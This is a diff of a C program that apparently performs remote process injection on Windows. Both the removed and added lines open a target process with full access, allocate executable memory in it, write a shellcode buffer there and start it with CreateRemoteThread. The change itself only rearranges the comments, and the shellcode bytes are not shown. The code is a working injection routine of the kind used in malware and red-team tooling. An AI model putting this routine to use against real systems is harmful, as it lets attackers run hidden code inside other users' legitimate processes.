@@ -59,33 +59,14 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
-    // Open the process with enough permission to create a remote thread
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-
-    // Allocate enough space in the new process for our shellcode
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
-    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    // Write the shellcode into the space we allocated for it
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
-
-    // Create a thread and start it at the space we allocated and mapped the shellcode to
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
-    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-
-    // Wait for the thread to finish
-    // https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
-    WaitForSingleObject(remoteThread, INFINITE);
-
-    // Free the memory we allocated
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex
-    VirtualFreeEx(processHandle, remoteBuffer, sizeof shellcode, MEM_RELEASE);
-
-    // Close handle since we are no longer using it
-    // https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
-    CloseHandle(processHandle);
+    // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);                                                            // Open the process with enough permission to create a remote thread
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Allocate enough space in the new process for our shellcode
+    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);                                     // Write the shellcode into the space we allocated for it
+    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);         // Create a thread and start it at the space we allocated and mapped the shellcode to
+    WaitForSingleObject(remoteThread, INFINITE);                                                                            // Wait for the thread to finish
+    VirtualFreeEx(processHandle, remoteBuffer, sizeof shellcode, MEM_RELEASE);                                              // Free the memory we allocated
+    CloseHandle(processHandle);                                                                                             // Close handle since we are no longer using it
 
     return 0;
 }
